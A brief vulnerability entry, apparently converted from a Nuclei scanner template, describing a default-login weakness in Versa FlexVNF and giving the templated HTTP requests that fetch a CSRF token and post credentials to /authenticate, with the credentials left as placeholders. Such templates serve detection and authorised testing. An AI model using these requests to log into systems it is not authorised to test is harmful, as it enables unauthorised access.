# Vulnerability: Versa FlexVNF - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`versa-flexvnf-default-login.yaml`)

## Description
Versa FlexVNF contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /authenticate HTTP/1.1
Host: {{Hostname}}

POST /authenticate HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8
CSRF-Token: {{xsrf_token}}

{"username":"{{username}}","password":"{{password}}"}
```

